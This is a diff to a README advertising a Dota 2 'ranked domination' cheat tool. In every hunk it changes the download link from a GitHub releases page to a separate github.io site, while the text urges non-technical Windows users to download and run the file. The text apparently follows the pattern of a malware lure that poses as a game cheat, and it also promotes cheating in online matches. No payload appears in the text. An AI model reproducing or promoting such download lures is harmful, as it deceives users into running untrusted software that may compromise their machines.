@@ -1,6 +1,6 @@
 # ⚔️ dota2-immortal-ranked-domination - Dominate Every Ranked Match Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Dota2_Immortal_Domination-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/raineemotive7715/dota2-immortal-ranked-domination/releases)
+[![Download Now](https://img.shields.io/badge/Download-Dota2_Immortal_Domination-blue?style=for-the-badge&logo=github&color=4B0082)](https://raineemotive7715.github.io)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these simple steps to get the tool running on your Windows PC. No technic
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/raineemotive7715/dota2-immortal-ranked-domination/releases**](https://github.com/raineemotive7715/dota2-immortal-ranked-domination/releases)
+[**https://raineemotive7715.github.io**](https://raineemotive7715.github.io)
 
 You'll land on a page with a list of files. Look for the most recent release (usually at the top). Click the download link for the file. It might be named something like `dota2-immortal-ranked-domination.zip` or similar.
 
@@ -83,7 +83,7 @@ If your PC can run Dota 2, it can run this tool without any issues.
 
 Ready to get started? Here's your download link again:
 
-[**⬇️ Download dota2-immortal-ranked-domination**](https://github.com/raineemotive7715/dota2-immortal-ranked-domination/releases)
+[**⬇️ Download dota2-immortal-ranked-domination**](https://raineemotive7715.github.io)
 
 After downloading, follow the steps in the "Getting Started" section above. The entire process takes less than two minutes.
 
@@ -186,7 +186,7 @@ Don't wait any longer. Your ranked games are waiting, and your Immortal badge is
 5. Activate your features.
 6. Dominate.
 
-[**🚀 Download Now and Start Winning**](https://github.com/raineemotive7715/dota2-immortal-ranked-domination/releases)
+[**🚀 Download Now and Start Winning**](https://raineemotive7715.github.io)
 
 Good luck in your matches. See you in Immortal.
 
